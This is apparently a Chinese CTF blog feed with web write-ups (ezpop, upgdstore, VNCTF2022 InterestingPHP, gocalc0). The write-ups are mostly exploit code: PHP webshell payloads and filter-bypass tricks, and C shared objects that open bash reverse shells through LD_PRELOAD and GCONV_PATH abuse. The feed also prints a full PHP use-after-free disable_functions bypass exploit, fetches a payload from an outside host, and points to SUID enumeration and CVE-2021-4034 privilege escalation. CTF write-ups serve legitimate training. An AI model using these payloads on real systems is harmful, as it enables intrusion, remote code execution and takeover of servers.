class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;#&#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;m1);    &#125;&#125;$r = <span class="hljs-keyword">new</span> fin();$r-&gt;f1 = <span class="hljs-keyword">new</span> what();$r-&gt;f1-&gt;a = <span class="hljs-keyword">new</span> mix();$r-&gt;f1-&gt;a-&gt;m1 = <span class="hljs-keyword">new</span> crow();$r-&gt;f1-&gt;a-&gt;m1-&gt;v1 = <span class="hljs-keyword">new</span> fin();$r-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1 = <span class="hljs-keyword">new</span> mix();<span class="hljs-comment">//$r-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1 = &quot;\r\nsystem(&#x27;cat H0mvz850F.php&#x27;);&quot;;</span>$r-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1 = <span class="hljs-string">&quot;?&gt;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>;<span class="hljs-keyword">echo</span>(urlencode(serialize($r)));</code></pre><h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p><code>文件上传</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202204092259351.png"></p><p>只能上传<code>*.php</code></p><p><code>&lt;?php phpinfo();?&gt;</code>可以上，读到phpinfo</p><p>拼接读取源码，读取<code>/flag</code>Permission denied</p><p><code>&lt;?php echo (&#39;fil&#39;.&#39;e_get_contents&#39;)(&#39;/var/www/html/index&#39;.&#39;.php&#39;)?&gt;</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params">$var</span>): <span class="hljs-title">bool</span></span>&#123;    $blacklist = [<span class="hljs-string">&quot;\$_&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;copy&quot;</span> ,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;usort&quot;</span>,<span class="hljs-string">&quot;include&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;file&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwriter&quot;</span>,<span class="hljs-string">&quot;fput&quot;</span>,<span class="hljs-string">&quot;copy&quot;</span>,<span class="hljs-string">&quot;curl&quot;</span>,<span class="hljs-string">&quot;fread&quot;</span>,<span class="hljs-string">&quot;fget&quot;</span>,<span class="hljs-string">&quot;function_exists&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;putenv&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;proc_close&quot;</span>, <span class="hljs-string">&quot;proc_get_status&quot;</span>,<span class="hljs-string">&quot;checkdnsrr&quot;</span>,<span class="hljs-string">&quot;getmxrr&quot;</span>,<span class="hljs-string">&quot;getservbyname&quot;</span>,<span class="hljs-string">&quot;getservbyport&quot;</span>, <span class="hljs-string">&quot;syslog&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;highlight_file&quot;</span>,<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;chmod&quot;</span>];    <span class="hljs-keyword">foreach</span>($blacklist <span class="hljs-keyword">as</span> $blackword)&#123;        <span class="hljs-keyword">if</span>(strstr($var, $blackword)) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;    &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;&#125;error_reporting(<span class="hljs-number">0</span>);<span class="hljs-comment">//设置上传目录</span>define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-string">&quot;./uploads&quot;</span>);$msg = <span class="hljs-string">&quot;Upload Success!&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;$temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];$file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];$ext = pathinfo($file_name,PATHINFO_EXTENSION);<span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/php/i&quot;</span>, strtolower($ext)))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;只要好看的php&quot;</span>);&#125;$content = file_get_contents($temp_file);<span class="hljs-keyword">if</span>(fun($content))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;诶，被我发现了吧&quot;</span>);&#125;$new_file_name = md5($file_name).<span class="hljs-string">&quot;.&quot;</span>.$ext;        $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . $new_file_name;        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;            $is_upload = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&#x27;Upload Failed!&#x27;</span>;            <span class="hljs-keyword">die</span>();        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.$msg.<span class="hljs-string">&quot; Look here~ &quot;</span>.$img_path.<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;&#125;</code></pre><p>过滤绕过一</p><blockquote><p>先上传个base64编码的一句话php文件，然后再上传另一个文件解码包含前面上传的文件,<code>Include</code>绕过<code>strstr</code></p><p><code>b64.php</code></p><p><code>PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</code></p><p><code>inc.php</code></p><p><code>&lt;?php Include(base64_decode(&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0wY2ZhMGFjNDE4NDMxYzM4Nzc1NzI5NTY5ZjE1MDdiNS5waHA=&quot;));?&gt;</code></p></blockquote><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202204092319404.png"></p><p>过滤绕过二</p><p>利用继承重写一个类，把动态方法调用变成静态方法</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>define(<span class="hljs-string">&quot;EV&quot;</span>, <span class="hljs-string">&quot;eva&quot;</span>.<span class="hljs-string">&quot;l&quot;</span>);define(<span class="hljs-string">&quot;GETCONT&quot;</span>, <span class="hljs-string">&quot;fil&quot;</span>.<span class="hljs-string">&quot;e_get_contents&quot;</span>);<span class="hljs-comment">// 由于禁止了$，我们只能从已有的地方获取$符</span>define(<span class="hljs-string">&quot;D&quot;</span>,(GETCONT)(<span class="hljs-string">&#x27;/var/www/html/index.php&#x27;</span>)[<span class="hljs-number">353</span>]);define(<span class="hljs-string">&quot;SHELL&quot;</span>,<span class="hljs-string">&quot;&lt;?php &quot;</span>.EV.<span class="hljs-string">&quot;(&quot;</span>.D.<span class="hljs-string">&quot;_POST[&#x27;a&#x27;]);&quot;</span>);<span class="hljs-keyword">echo</span> (GETCONT)(<span class="hljs-string">&#x27;./shell.php&#x27;</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">splf</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SplFileObject</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">parent</span>::fwrite(SHELL);    &#125;&#125;define(<span class="hljs-string">&quot;PHARA&quot;</span>, <span class="hljs-keyword">new</span> splf(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>));</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202204102031245.png"></p><p>上传文件一</p><p><code>利用SplFileObject 上传恶意so文件反弹shell</code></p><pre><code class="hljs c"><span class="hljs-comment">//exp.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span><span class="hljs-function"></span>&#123;     system(<span class="hljs-string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/xxx.xx.xxx.xx/2233 &lt;&amp;1&#x27;&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">geteuid</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;     <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>)    &#123;         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     &#125;    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>); payload();&#125;</code></pre><p>编译          <code>gcc exp.c -o aa.so -shared -fPIC</code></p><p>上传</p><pre><code class="hljs shell">POST /uploads/318a654260f9e6f122c9bd8b425fe47b.php HTTP/1.1Host: 255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81Content-Length: 77Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36Origin: http://255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81/uploads/318a654260f9e6f122c9bd8b425fe47b.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: __gads=ID=ff563d10420b0338-2258e7c799ca00cd:T=1627650787:RT=1627650787:S=ALNI_MbFtePzSmcYwzN2fcIiRk_sifUfpAConnection: close1=<span class="hljs-meta">$</span><span class="bash">url = <span class="hljs-string">&quot;http://xxx.xx.xx.xx/aa.so&quot;</span>;</span><span class="hljs-meta">$</span><span class="bash">file1 = new SplFileObject(<span class="hljs-variable">$url</span>,<span class="hljs-string">&#x27;r&#x27;</span>);</span><span class="hljs-meta">$</span><span class="bash">a=<span class="hljs-string">&quot;&quot;</span>;</span>while(!$file1-&gt;eof())&#123;    $a=$a.$file1-&gt;fgets();&#125;<span class="hljs-meta">$</span><span class="bash">file2 = new SplFileObject(<span class="hljs-string">&#x27;aa.so&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>);</span><span class="hljs-meta">$</span><span class="bash">file2-&gt;fwrite(<span class="hljs-variable">$a</span>);</span></code></pre><p>访问<code>255f6d1e-c214-4ba0-a310-23c2190232e5.node4.buuoj.cn:81/uploads/aa.so</code>能下载下来说明上传成功</p><p>服务器监听端口</p><p>执行<code>1=putenv(&quot;LD_PRELOAD=/var/www/html/uploads/aa.so&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</code></p><p>反弹成功</p><p><code>www-data</code></p><p>提权</p><p>查看    <code>SUID</code>  的命令</p><pre><code class="hljs shell">find / -user root -perm -4000 -print 2&gt;/dev/nullfind /bin -perm -u=s -type f 2&gt;/dev/nullfind /usr -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202204102022947.png"></p><p><code>nl</code>读取flag</p><p><code>nl /flag</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202204102025601.png"></p><p>上传文件二</p><p>上传<code>exp.so</code>和<code>gconv-modules</code>bypass</p><pre><code class="hljs c"><span class="hljs-comment">//exp.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">gconv</span><span class="hljs-params">()</span> </span>&#123;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">gconv_init</span><span class="hljs-params">()</span> </span>&#123;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pwned&quot;</span>);  system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/2333 0&gt;&amp;1&#x27;&quot;</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><p>gconv-modules</p><pre><code class="hljs txt">module  EXP//    INTERNAL    ../../../../../../../../tmp/exp    2module  INTERNAL   EXP//    ../../../../../../../../tmp/exp    2</code></pre><p><code>1=putenv(&quot;GCONV_PATH=/tmp/&quot;);include(&#39;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#39;);</code>触发</p><p>参考：</p><p><a href="https://forum.butian.net/share/1464">https://forum.butian.net/share/1464</a></p><p><a href="https://www.shangyexinzhi.com/article/4711909.html">https://www.shangyexinzhi.com/article/4711909.html</a></p><p><a href="https://blog.csdn.net/qq_42880719/article/details/123763744">https://blog.csdn.net/qq_42880719/article/details/123763744</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ezpop&quot;&gt;&lt;a href=&quot;#ezpop&quot; class=&quot;headerlink&quot; title=&quot;ezpop&quot;&gt;&lt;/a&gt;ezpop&lt;/h2&gt;&lt;p&gt;&lt;code&gt;反序列化&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;poc&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;hljs ph</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="VNCTF2022" scheme="http://lll-nnn.github.io/categories/CTF/wp/VNCTF2022/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="VNCTF2022" scheme="http://lll-nnn.github.io/tags/VNCTF2022/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF2022</title>
    <link href="http://lll-nnn.github.io/2022/02/18/VNCTF2022/"/>
    <id>http://lll-nnn.github.io/2022/02/18/VNCTF2022/</id>
    <published>2022-02-17T16:02:59.000Z</published>
    <updated>2022-02-18T10:27:28.691Z</updated>
    
    <content type="html"><![CDATA[<h2 id="InterestingPHP"><a href="#InterestingPHP" class="headerlink" title="InterestingPHP"></a>InterestingPHP</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> highlight_file(<span class="hljs-keyword">__FILE__</span>); @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);<span class="hljs-meta">?&gt;</span></code></pre><p>phpinfo被ban,可以<code>var_dump(ini_get_all());</code></p><p><code>disable_function</code>  </p><p><code>open_basedir</code></p><p><code>bypass</code>—-&gt;<code>https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php</code></p><p>fwrite 被禁了，改成 fputs</p><p>一句话改为<code>POST</code>传值<code>?exp=eval($_POST[1]);</code>，构造表单</p><pre><code>POST /?exp=eval($_POST[1]); HTTP/1.1Host: 7c04b880-d3fb-4428-b036-3b2c06f5ae68.node4.buuoj.cn:81Content-Length: 6915Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryj28zfvoWVxnHdp29Content-Disposition: form-data; name=&quot;1&quot;pwn(&#39;whoami&#39;);function pwn($cmd) &#123;    define(&#39;LOGGING&#39;, false);    define(&#39;CHUNK_DATA_SIZE&#39;, 0x60);    define(&#39;CHUNK_SIZE&#39;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);    define(&#39;FILTER_SIZE&#39;, ZEND_DEBUG_BUILD ? 0x70 : 0x50);    define(&#39;STRING_SIZE&#39;, CHUNK_DATA_SIZE - 0x18 - 1);    define(&#39;CMD&#39;, $cmd);    for($i = 0; $i &lt; 10; $i++) &#123;        $groom[] = Pwn::alloc(STRING_SIZE);    &#125;    stream_filter_register(&#39;pwn_filter&#39;, &#39;Pwn&#39;);    $fd = fopen(&#39;php://memory&#39;, &#39;w&#39;);    stream_filter_append($fd,&#39;pwn_filter&#39;);    fputs($fd, &#39;x&#39;);&#125;class Helper &#123; public $a, $b, $c; &#125;class Pwn extends php_user_filter &#123;    private $abc, $abc_addr;    private $helper, $helper_addr, $helper_off;    private $uafp, $hfp;    public function filter($in, $out, &amp;$consumed, $closing) &#123;        if($closing) return;        stream_bucket_make_writeable($in);        $this-&gt;filtername = Pwn::alloc(STRING_SIZE);        fclose($this-&gt;stream);        $this-&gt;go();        return PSFS_PASS_ON;    &#125;    private function go() &#123;        $this-&gt;abc = &amp;$this-&gt;filtername;        $this-&gt;make_uaf_obj();        $this-&gt;helper = new Helper;        $this-&gt;helper-&gt;b = function($x) &#123;&#125;;        $this-&gt;helper_addr = $this-&gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;        $this-&gt;log(&quot;helper @ 0x%x&quot;, $this-&gt;helper_addr);        $this-&gt;abc_addr = $this-&gt;helper_addr - CHUNK_SIZE;        $this-&gt;log(&quot;abc @ 0x%x&quot;, $this-&gt;abc_addr);        $this-&gt;helper_off = $this-&gt;helper_addr - $this-&gt;abc_addr - 0x18;        $helper_handlers = $this-&gt;str2ptr(CHUNK_SIZE);        $this-&gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers);        $this-&gt;prepare_leaker();        $binary_leak = $this-&gt;read($helper_handlers + 8);        $this-&gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak);        $this-&gt;prepare_cleanup($binary_leak);        $closure_addr = $this-&gt;str2ptr($this-&gt;helper_off + 0x38);        $this-&gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr);        $closure_ce = $this-&gt;read($closure_addr + 0x10);        $this-&gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce);        $basic_funcs = $this-&gt;get_basic_funcs($closure_ce);        $this-&gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs);        $zif_system = $this-&gt;get_system($basic_funcs);        $this-&gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system);        $fake_closure_off = $this-&gt;helper_off + CHUNK_SIZE * 2;        for($i = 0; $i &lt; 0x138; $i += 8) &#123;            $this-&gt;write($fake_closure_off + $i, $this-&gt;read($closure_addr + $i));        &#125;        $this-&gt;write($fake_closure_off + 0x38, 1, 4);        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;        $this-&gt;write($fake_closure_off + $handler_offset, $zif_system);        $fake_closure_addr = $this-&gt;helper_addr + $fake_closure_off - $this-&gt;helper_off;        $this-&gt;write($this-&gt;helper_off + 0x38, $fake_closure_addr);        $this-&gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr);        $this-&gt;cleanup();        ($this-&gt;helper-&gt;b)(CMD);    &#125;    private function make_uaf_obj() &#123;        $this-&gt;uafp = fopen(&#39;php://memory&#39;, &#39;w&#39;);        fputs($this-&gt;uafp, pack(&#39;QQQ&#39;, 1, 0, 0xDEADBAADC0DE));        for($i = 0; $i &lt; STRING_SIZE; $i++) &#123;            fputs($this-&gt;uafp, &quot;\x00&quot;);        &#125;    &#125;    private function prepare_leaker() &#123;        $str_off = $this-&gt;helper_off + CHUNK_SIZE + 8;        $this-&gt;write($str_off, 2);        $this-&gt;write($str_off + 0x10, 6);        $val_off = $this-&gt;helper_off + 0x48;        $this-&gt;write($val_off, $this-&gt;helper_addr + CHUNK_SIZE + 8);        $this-&gt;write($val_off + 8, 0xA);    &#125;    private function prepare_cleanup($binary_leak) &#123;        $ret_gadget = $binary_leak;        do &#123;            --$ret_gadget;        &#125; while($this-&gt;read($ret_gadget, 1) !== 0xC3);        $this-&gt;log(&quot;ret gadget = 0x%x&quot;, $ret_gadget);        $this-&gt;write(0, $this-&gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));        $this-&gt;write(8, $ret_gadget);    &#125;    private function read($addr, $n = 8) &#123;        $this-&gt;write($this-&gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10);        $value = strlen($this-&gt;helper-&gt;c);        if($n !== 8) &#123; $value &amp;= (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; &#125;        return $value;    &#125;    private function write($p, $v, $n = 8) &#123;        for($i = 0; $i &lt; $n; $i++) &#123;            $this-&gt;abc[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        &#125;    &#125;    private function get_basic_funcs($addr) &#123;        while(true) &#123;            // In rare instances the standard module might lie after the addr we&#39;re starting            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.            // In that case, changing the direction of the search should fix the crash.            // $addr += 0x10;            $addr -= 0x10;            if($this-&gt;read($addr, 4) === 0xA8 &amp;&amp;                in_array($this-&gt;read($addr + 4, 4),                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) &#123;                $module_name_addr = $this-&gt;read($addr + 0x20);                $module_name = $this-&gt;read($module_name_addr);                if($module_name === 0x647261646e617473) &#123;                    $this-&gt;log(&quot;standard module @ 0x%x&quot;, $addr);                    return $this-&gt;read($addr + 0x28);                &#125;            &#125;        &#125;    &#125;    private function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = $this-&gt;read($addr);            $f_name = $this-&gt;read($f_entry, 6);            if($f_name === 0x6d6574737973) &#123;                return $this-&gt;read($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry !== 0);    &#125;    private function cleanup() &#123;        $this-&gt;hfp = fopen(&#39;php://memory&#39;, &#39;w&#39;);        fputs($this-&gt;hfp, pack(&#39;QQ&#39;, 0, $this-&gt;abc_addr));        for($i = 0; $i &lt; FILTER_SIZE - 0x10; $i++) &#123;            fputs($this-&gt;hfp, &quot;\x00&quot;);        &#125;    &#125;    private function str2ptr($p = 0, $n = 8) &#123;        $address = 0;        for($j = $n - 1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($this-&gt;abc[$p + $j]);        &#125;        return $address;    &#125;    private function ptr2str($ptr, $n = 8) &#123;        $out = &#39;&#39;;        for ($i = 0; $i &lt; $n; $i++) &#123;            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    private function log($format, $val = &#39;&#39;) &#123;        if(LOGGING) &#123;            printf(&quot;&#123;$format&#125;\n&quot;, $val);        &#125;    &#125;    static function alloc($size) &#123;        return str_shuffle(str_repeat(&#39;A&#39;, $size));    &#125;&#125;------WebKitFormBoundaryj28zfvoWVxnHdp29--</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202180010240.png"></p><p>反弹shell<br><code>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/xxx.xx.xxx.xxx/9000 &lt;&amp;1&#39;</code></p><p><code>https://github.com/arthepsy/CVE-2021-4034 提权</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202180013878.png"><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202180014352.png"></p><p><a href="https://blog.m1n.me/2022/02/13/VNCTF2022-Web-WP/">MORE</a></p><h2 id="gocalc0"><a href="#gocalc0" class="headerlink" title="gocalc0"></a>gocalc0</h2><p>go ssti<br><code>&#123;&#123;.&#125;&#125;</code>获取源码</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (_ <span class="hljs-string">&quot;embed&quot;</span><span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-string">&quot;os&quot;</span><span class="hljs-string">&quot;reflect&quot;</span><span class="hljs-string">&quot;strings&quot;</span><span class="hljs-string">&quot;text/template&quot;</span><span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span><span class="hljs-string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><span class="hljs-string">&quot;github.com/maja42/goval&quot;</span>)<span class="hljs-comment">//go:embed template/index.html</span><span class="hljs-keyword">var</span> tpl <span class="hljs-keyword">string</span><span class="hljs-comment">//go:embed main.go</span><span class="hljs-keyword">var</span> source <span class="hljs-keyword">string</span><span class="hljs-keyword">type</span> Eval <span class="hljs-keyword">struct</span> &#123;E <span class="hljs-keyword">string</span> <span class="hljs-string">`json:&quot;e&quot; form:&quot;e&quot; binding:&quot;required&quot;`</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(e Eval)</span> <span class="hljs-title">Result</span><span class="hljs-params">()</span> <span class="hljs-params">(<span class="hljs-keyword">string</span>, error)</span></span> &#123;eval := goval.NewEvaluator()result, err := eval.Evaluate(e.E, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err&#125;t := reflect.ValueOf(result).Type().Kind()<span class="hljs-keyword">if</span> t == reflect.Int &#123;<span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">&quot;%d&quot;</span>, result.(<span class="hljs-keyword">int</span>)), <span class="hljs-literal">nil</span>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> t == reflect.String &#123;<span class="hljs-keyword">return</span> result.(<span class="hljs-keyword">string</span>), <span class="hljs-literal">nil</span>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, fmt.Errorf(<span class="hljs-string">&quot;not valid type&quot;</span>)&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(e Eval)</span> <span class="hljs-title">String</span><span class="hljs-params">()</span> <span class="hljs-title">string</span></span> &#123;res, err := e.Result()<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;fmt.Println(err)res = <span class="hljs-string">&quot;invalid&quot;</span>&#125;<span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">&quot;%s = %s&quot;</span>, e.E, res)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">render</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;session := sessions.Default(c)<span class="hljs-keyword">var</span> his <span class="hljs-keyword">string</span><span class="hljs-keyword">if</span> session.Get(<span class="hljs-string">&quot;history&quot;</span>) == <span class="hljs-literal">nil</span> &#123;his = <span class="hljs-string">&quot;&quot;</span>&#125; <span class="hljs-keyword">else</span> &#123;his = session.Get(<span class="hljs-string">&quot;history&quot;</span>).(<span class="hljs-keyword">string</span>)&#125;fmt.Println(strings.ReplaceAll(tpl, <span class="hljs-string">&quot;&#123;&#123;result&#125;&#125;&quot;</span>, his))t, err := template.New(<span class="hljs-string">&quot;index&quot;</span>).Parse(strings.ReplaceAll(tpl, <span class="hljs-string">&quot;&#123;&#123;result&#125;&#125;&quot;</span>, his))<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;fmt.Println(err)c.String(<span class="hljs-number">500</span>, <span class="hljs-string">&quot;internal error&quot;</span>)<span class="hljs-keyword">return</span>&#125;<span class="hljs-keyword">if</span> err := t.Execute(c.Writer, <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span>&#123;<span class="hljs-string">&quot;s0uR3e&quot;</span>: source,&#125;); err != <span class="hljs-literal">nil</span> &#123;fmt.Println(err)&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;port := os.Getenv(<span class="hljs-string">&quot;PORT&quot;</span>)<span class="hljs-keyword">if</span> port == <span class="hljs-string">&quot;&quot;</span> &#123;port = <span class="hljs-string">&quot;8080&quot;</span>&#125;r := gin.Default()store := cookie.NewStore([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;woW_you-g0t_sourcE_co6e&quot;</span>))r.Use(sessions.Sessions(<span class="hljs-string">&quot;session&quot;</span>, store))r.GET(<span class="hljs-string">&quot;/&quot;</span>, <span 